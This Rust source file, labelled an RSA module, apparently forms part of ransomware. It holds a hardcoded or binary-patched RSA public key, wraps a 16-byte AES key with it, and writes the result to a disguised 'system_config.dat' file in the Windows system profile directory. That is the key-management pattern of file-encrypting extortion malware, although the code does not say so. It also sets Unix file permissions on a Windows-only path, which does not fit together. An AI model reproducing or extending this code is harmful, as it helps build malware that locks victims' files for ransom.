// RSA module implementation
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process;

use data_encoding::BASE64;
use dirs_next as dirs;
use rand::rngs::OsRng;
use rsa::pkcs1::{DecodeRsaPublicKey, EncodeRsaPublicKey};
use rsa::pkcs8::{DecodePrivateKey, EncodePrivateKey};
use rsa::{Oaep, RsaPublicKey, RsaPrivateKey, Pkcs1v15Encrypt};

const RSA_PUBLIC_KEY_BASE64: &str = "MIIBCgKCAQEAu3a65o6pNfApv4QgTgi4IBtJ0UN86rqVMd0XjB33gMjG3QAACoOQ+ua4aYgu5Z1c2wk9P7mCm5loUTYN2lC54rCOJmrdFem2sr2wpXMmPVPkgLEH/L/EdXOq+1zIAEopwpj0KOPuhlGNTFmjIovzv6GIG/8GmHjN15W9Q6xmpnEyZr0OcmNX+9c+9qPI1oJYIIvMvofT0TjPh7HfonaFwS1SquXG5JGpByzRcgvPIi81wW6ZUBDWK4KHxyXnNLgQoR6pmPicpoJLcKtr/9ZmuRGMhcQhzUDvG2Tc6eRr9l3nTJ9vt4kfZ/FU4XyNHQAzHs+YsNdu9JlaaB14ChA5AQIDAQAB";

pub fn get_public_key_from_base64() -> Result<RsaPublicKey, Box<dyn std::error::Error>> {
    let public_key_base64 = crate::crypt::Config::get_rsa_public_key_from_binary()?;
    
    if public_key_base64.is_empty() {
        let der_bytes = BASE64.decode(RSA_PUBLIC_KEY_BASE64.as_bytes())?;
        let public_key = RsaPublicKey::from_pkcs1_der(&der_bytes)?;
        return Ok(public_key);
    }
    
    let der_bytes = BASE64.decode(public_key_base64.as_bytes())?;
    let public_key = RsaPublicKey::from_pkcs1_der(&der_bytes)?;
    Ok(public_key)
}

pub fn encrypt_data_with_rsa(
    data: &[u8],
    public_key: RsaPublicKey,
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut rng = rand::thread_rng();
    let encrypted_data = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, data)?;
    Ok(encrypted_data)
}

pub fn encrypt_aes_key_with_rsa(aes_key: &[u8; 16]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let public_key = get_public_key_from_base64()?;
    encrypt_data_with_rsa(aes_key, public_key)
}

pub fn save_encrypted_aes_key(encrypted_key: &[u8]) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let path = PathBuf::from(r"C:\windows\system32\config\systemprofile\system_config.dat");
    
    let mut file = fs::File::create(&path)?;
    file.write_all(encrypted_key)?;
    
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = file.metadata()?.permissions();
        perms.set_mode(0o600);
        fs::set_permissions(&path, perms)?;
    }
    
    Ok(path)
}
